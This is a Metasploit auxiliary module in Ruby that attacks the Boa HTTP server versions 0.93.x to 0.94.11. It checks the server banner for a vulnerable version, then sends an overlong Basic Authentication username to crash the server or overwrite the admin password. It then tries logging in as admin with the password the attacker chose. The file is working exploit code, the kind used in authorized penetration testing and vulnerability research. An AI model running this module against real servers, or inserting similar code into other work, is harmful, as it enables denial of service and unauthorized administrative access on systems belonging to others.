##
# $Id: boa_auth_dos.rb 15014 2012-06-06 15:13:11Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Boa HTTPd Basic Authentication Overflow',
      'Description'	=>
        %q{
          The Intersil extention in the Boa HTTP Server 0.93.x - 0.94.11
          allows denial of service or possibly authentication bypass
          via a Basic Authentication header with a user string greater than 127 characters. You must set
          the request URI to the directory that requires basic authentication.
        },
      'Author'	=>
        [
          'Luca "ikki" Carettoni <luca.carettoni[at]securenetwork.it>', #original discoverer
          'Claudio "paper" Merloni <claudio.merloni[at]securenetwork.it>', #original discoverer
          'Max Dietz <maxwell.r.dietz[at]gmail.com>' #metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Version'        => '$Revision$',
      'References'     =>
        [
          [ 'URL', 'http://packetstormsecurity.org/files/59347/boa-bypass.txt.html'],
        ],
      'DisclosureDate' => 'Sep 10 2007'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('URI', [ true,  "The request URI", '/']),
        OptString.new('PASSWORD', [true, 'The password to set (if possible)', 'pass'])
      ], self.class)
  end

  def check
    begin
      res = send_request_cgi({
        'uri'=>'/',
        'method'=>'GET'
      })
      if (res and (m = res.headers['Server'].match(/Boa\/(.*)/)))
        print_status("Boa Version Detected: #{m[1]}")
        return Exploit::CheckCode::Safe if (m[1][0].ord-48>0) # boa server wrong version
        return Exploit::CheckCode::Safe if (m[1][3].ord-48>4)
        return Exploit::CheckCode::Vulnerable
      else
        print_status("Not a Boa Server!")
        return Exploit::CheckCode::Safe # not a boa server
      end
    rescue Rex::ConnectionRefused
      print_error("Connection refused by server.")
      return Exploit::CheckCode::Safe
    end
  end

  def run
    if check == Exploit::CheckCode::Vulnerable
      datastore['BasicAuthUser'] = Rex::Text.rand_text_alpha(127)
      datastore['BasicAuthPass'] = datastore['PASSWORD']
      res = send_request_cgi({
        'uri'=> datastore['URI'],
        'method'=>'GET'
      })
      if (res != nil)
        print_status("Server still operational... checking to see if password has been overwritten.")
        datastore['BasicAuthUser'] = 'admin'
        res = send_request_cgi({
          'uri'=>datastore['URI'],
          'method'=>'GET'
        })
        if (res.code == 200)
          print_status("Access successful with admin:#{datastore['PASSWORD']}")
        elsif (res.code != 401)
          print_status("Access not forbidden, but another error has occured: Code #{res.code} encountered")
        else
          print_status("Access forbidden, this module has failed.")
        end
      else
        print_status("Denial of Service has succeeded.")
      end
    end
  end
end
